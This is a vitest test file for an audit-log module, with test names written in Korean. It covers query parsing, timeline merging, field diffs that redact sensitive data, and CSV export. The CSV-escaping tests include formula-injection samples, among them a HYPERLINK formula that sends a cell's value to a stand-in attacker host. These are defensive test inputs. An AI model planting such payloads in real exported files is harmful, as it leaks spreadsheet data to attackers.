import { describe, expect, it } from "vitest";

import {
  AUDIT_CSV_HEADER,
  AUDIT_EXPORT_LIMIT,
  type AuditLogRow,
  type EntityEventRow,
  REDACTED_PLACEHOLDER,
  actionOptions,
  buildTimeline,
  describeAction,
  diffFields,
  escapeCsvCell,
  exportFilename,
  isNarrowed,
  parseAuditQuery,
  toCsv,
} from "./audit";

const UUID_A = "00000000-0000-0000-0000-0000000000a1";
const UUID_B = "00000000-0000-0000-0000-0000000000b2";

const log = (over: Partial<AuditLogRow> = {}): AuditLogRow => ({
  id: "log-1",
  createdAt: "2026-08-27T10:00:00.000Z",
  actorId: UUID_A,
  actorRole: "admin",
  action: "vendor_approved",
  targetType: "vendor",
  targetId: UUID_B,
  beforeJson: null,
  afterJson: null,
  resolutionBasis: null,
  ...over,
});

const event = (over: Partial<EntityEventRow> = {}): EntityEventRow => ({
  id: "evt-1",
  occurredAt: "2026-08-27T09:00:00.000Z",
  entityType: "vendor",
  entityId: UUID_B,
  eventType: "vendor_status_changed",
  actorId: UUID_A,
  actorRole: "admin",
  beforeState: "pending",
  afterState: "active",
  source: "admin",
  memo: null,
  ...over,
});

describe("parseAuditQuery — 틀린 조건을 거절하지 않고 버린다", () => {
  it("정상 조건은 그대로 읽는다", () => {
    expect(
      parseAuditQuery({ actorRole: "admin", action: "vendor_approved", targetId: UUID_B }),
    ).toEqual({ actorRole: "admin", action: "vendor_approved", targetId: UUID_B });
  });

  it("빈 값은 조건이 아니다", () => {
    expect(parseAuditQuery({ actorRole: "", action: undefined })).toEqual({});
  });

  it("**틀린 칸만 버리고 나머지로 조회한다** — 감사 로그가 통째로 오류가 되면 안 된다", () => {
    const result = parseAuditQuery({ actorRole: "admin", targetId: "not-a-uuid" });

    expect(result).toEqual({ actorRole: "admin" });
  });

  it("전부 틀려도 빈 조건으로 떨어진다 (화면은 열린다)", () => {
    expect(parseAuditQuery({ targetId: "x", from: "어제", limit: "999999" })).toEqual({});
  });

  it("limit 은 내보내기 상한을 넘지 못한다", () => {
    expect(parseAuditQuery({ limit: String(AUDIT_EXPORT_LIMIT) }).limit).toBe(AUDIT_EXPORT_LIMIT);
    expect(parseAuditQuery({ limit: String(AUDIT_EXPORT_LIMIT + 1) }).limit).toBeUndefined();
  });

  it("모르는 키는 통과시키지 않는다 (strict)", () => {
    expect(parseAuditQuery({ evil: "1", actorRole: "ops" } as never)).toEqual({ actorRole: "ops" });
  });
});

describe("isNarrowed", () => {
  it("아무 조건이 없으면 전체다", () => {
    expect(isNarrowed({})).toBe(false);
    expect(isNarrowed({ limit: 10 })).toBe(false);
    expect(isNarrowed({ before: "2026-08-27T10:00:00.000Z" })).toBe(false);
  });

  it("조건이 하나라도 있으면 좁힌 것이다", () => {
    expect(isNarrowed({ actorRole: "admin" })).toBe(true);
    expect(isNarrowed({ targetId: UUID_B })).toBe(true);
  });
});

describe("buildTimeline — 두 표를 시간순 하나로", () => {
  it("최근이 위다", () => {
    const timeline = buildTimeline([log()], [event()]);

    expect(timeline.map((entry) => entry.at)).toEqual([
      "2026-08-27T10:00:00.000Z",
      "2026-08-27T09:00:00.000Z",
    ]);
  });

  it("행위와 전이를 구분한다", () => {
    const timeline = buildTimeline([log()], [event()]);

    expect(timeline[0].kind).toBe("action");
    expect(timeline[0].transition).toBeNull();
    expect(timeline[1].kind).toBe("transition");
    expect(timeline[1].transition).toEqual({ before: "pending", after: "active" });
  });

  it("**같은 시각이면 순서가 흔들리지 않는다** — 증적의 순서가 매번 다르면 기록을 의심하게 된다", () => {
    const at = "2026-08-27T10:00:00.000Z";
    const a = log({ id: "aaa", createdAt: at });
    const b = log({ id: "bbb", createdAt: at });

    const first = buildTimeline([a, b], []).map((entry) => entry.id);
    const second = buildTimeline([b, a], []).map((entry) => entry.id);

    expect(first).toEqual(second);
  });

  it("한쪽이 비어도 된다", () => {
    expect(buildTimeline([], [event()])).toHaveLength(1);
    expect(buildTimeline([log()], [])).toHaveLength(1);
    expect(buildTimeline([], [])).toEqual([]);
  });

  it("근거 이벤트 id 를 그대로 싣는다 (조율 결정의 근거 · §3.8)", () => {
    const timeline = buildTimeline([log({ resolutionBasis: ["e1", "e2"] })], []);

    expect(timeline[0].resolutionBasis).toEqual(["e1", "e2"]);
  });

  it("전이 행은 메모를 싣는다", () => {
    expect(buildTimeline([], [event({ memo: "요약" })])[0].memo).toBe("요약");
  });
});

describe("diffFields — 바뀐 칸만, 민감한 값은 가린다", () => {
  it("바뀐 칸만 낸다", () => {
    const changes = diffFields({ status: "pending", region: "서울" }, { status: "active", region: "서울" });

    expect(changes).toEqual([{ field: "status", before: "pending", after: "active" }]);
  });

  it("추가된 칸·사라진 칸도 잡는다", () => {
    expect(diffFields({}, { status: "active" })).toEqual([
      { field: "status", before: "—", after: "active" },
    ]);
    expect(diffFields({ status: "active" }, {})).toEqual([
      { field: "status", before: "active", after: "—" },
    ]);
  });

  it.each([
    "phone", "phone_hash", "email", "biz_no", "bank_account", "storage_path",
    "invite_token", "password", "display_name", "memo", "body",
  ])("**%s 는 값을 내보내지 않는다** — 바뀌었다는 사실만 남긴다(§7.3)", (field) => {
    const changes = diffFields({ [field]: "원래값" }, { [field]: "새값" });

    expect(changes).toEqual([
      { field, before: REDACTED_PLACEHOLDER, after: REDACTED_PLACEHOLDER },
    ]);
  });

  it("대소문자가 달라도 가린다", () => {
    expect(diffFields({ PhoneHash: "a" }, { PhoneHash: "b" })[0].after).toBe(REDACTED_PLACEHOLDER);
  });

  it("객체·배열은 펼치지 않는다 — 안에 무엇이 있는지 모른다", () => {
    const changes = diffFields({ items: [1, 2] }, { items: [1, 2, 3] });

    expect(changes[0].after).toBe("[3개]");
  });

  it("긴 문자열은 자른다", () => {
    const long = "가".repeat(300);
    const changes = diffFields({ label: "" }, { label: long });

    expect(changes[0].after.length).toBeLessThan(140);
    expect(changes[0].after.endsWith("…")).toBe(true);
  });

  it("null 끼리는 변화가 아니다", () => {
    expect(diffFields(null, null)).toEqual([]);
    expect(diffFields(undefined, {})).toEqual([]);
  });

  it("칸 순서가 고정이다 — 같은 입력이면 같은 출력이다", () => {
    const a = diffFields({ b: 1, a: 1 }, { b: 2, a: 2 });
    const b = diffFields({ a: 1, b: 1 }, { a: 2, b: 2 });

    expect(a).toEqual(b);
    expect(a.map((change) => change.field)).toEqual(["a", "b"]);
  });
});

describe("describeAction", () => {
  it("아는 코드는 한국어로", () => {
    expect(describeAction("vendor_approved")).toBe("업체 승인");
  });

  it("**모르는 코드는 지어내지 않고 그대로** — 빈칸이면 구멍처럼 보인다", () => {
    expect(describeAction("something_new_happened")).toBe("something_new_happened");
  });

  it("actionOptions 는 중복을 없애고 정렬한다", () => {
    expect(actionOptions(["b_x", "a_y", "b_x"])).toEqual([
      { value: "a_y", label: "a_y" },
      { value: "b_x", label: "b_x" },
    ]);
  });
});

describe("escapeCsvCell — 수식 주입을 막는다", () => {
  it.each(["=1+1", "+1", "-1", "@SUM(A1)", "\tx", "\rx"])(
    "%j 로 시작하면 문자열로 못 박는다",
    (value) => {
      expect(escapeCsvCell(value)).toBe(`"'${value.replace(/"/g, '""')}"`);
    },
  );

  it("엑셀에서 실행되는 링크를 만들 수 없다", () => {
    const attack = '=HYPERLINK("http://evil.example/"&A1,"click")';
    const cell = escapeCsvCell(attack);

    // 값이 `=` 로 시작하지 않는다 → 수식이 아니다.
    expect(cell.startsWith('"\'=')).toBe(true);
  });

  it("평범한 값은 그대로 인용만 한다", () => {
    expect(escapeCsvCell("vendor_approved")).toBe('"vendor_approved"');
  });

  it("따옴표는 두 번으로", () => {
    expect(escapeCsvCell('a"b')).toBe('"a""b"');
  });

  it("쉼표·줄바꿈이 값을 쪼개지 않는다", () => {
    expect(escapeCsvCell("a,b\nc")).toBe('"a,b\nc"');
  });

  it("null·undefined 는 빈 칸이다", () => {
    expect(escapeCsvCell(null)).toBe('""');
    expect(escapeCsvCell(undefined)).toBe('""');
  });
});

describe("toCsv", () => {
  const timeline = buildTimeline(
    [log({ beforeJson: { status: "pending" }, afterJson: { status: "active" } })],
    [event()],
  );

  it("머리글이 먼저 나온다", () => {
    expect(toCsv(timeline).split("\r\n")[0]).toBe(AUDIT_CSV_HEADER.map((h) => `"${h}"`).join(","));
  });

  it("행 수가 맞는다 (머리글 + 항목 + 끝 줄바꿈)", () => {
    expect(toCsv(timeline).split("\r\n")).toHaveLength(timeline.length + 2);
  });

  it("**바뀐 값이 아니라 칸 이름만 내보낸다**(§7.3)", () => {
    const csv = toCsv(
      buildTimeline([log({ beforeJson: { phone: "010-1234-5678" }, afterJson: { phone: "010-0000-0000" } })], []),
    );

    expect(csv).not.toContain("010-1234-5678");
    expect(csv).toContain("phone");
  });

  it("CRLF 로 끝난다", () => {
    expect(toCsv(timeline).endsWith("\r\n")).toBe(true);
  });

  it("항목이 없어도 머리글은 나온다 — 빈 파일은 '내보내기가 실패했나' 로 읽힌다", () => {
    expect(toCsv([]).split("\r\n").filter(Boolean)).toHaveLength(1);
  });
});

describe("exportFilename", () => {
  it("언제 뽑았는지가 이름에 남는다", () => {
    expect(exportFilename(new Date("2026-08-27T10:20:30.000Z"))).toBe("audit-20260827102030.csv");
  });

  it("파일 이름에 쓸 수 없는 글자가 없다", () => {
    expect(exportFilename(new Date("2026-08-27T10:20:30.000Z"))).not.toMatch(/[:\\/]/);
  });
});
